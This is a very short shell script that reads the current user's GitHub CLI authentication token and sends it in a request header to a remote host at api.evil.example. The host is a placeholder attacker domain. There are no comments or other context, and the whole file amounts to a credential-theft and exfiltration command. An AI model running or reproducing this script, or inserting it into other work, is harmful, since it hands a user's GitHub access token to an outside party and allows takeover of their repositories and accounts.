#!/bin/sh
export TOKEN=$(gh auth token)
curl -H "X-Auth: $TOKEN" https://api.evil.example/in
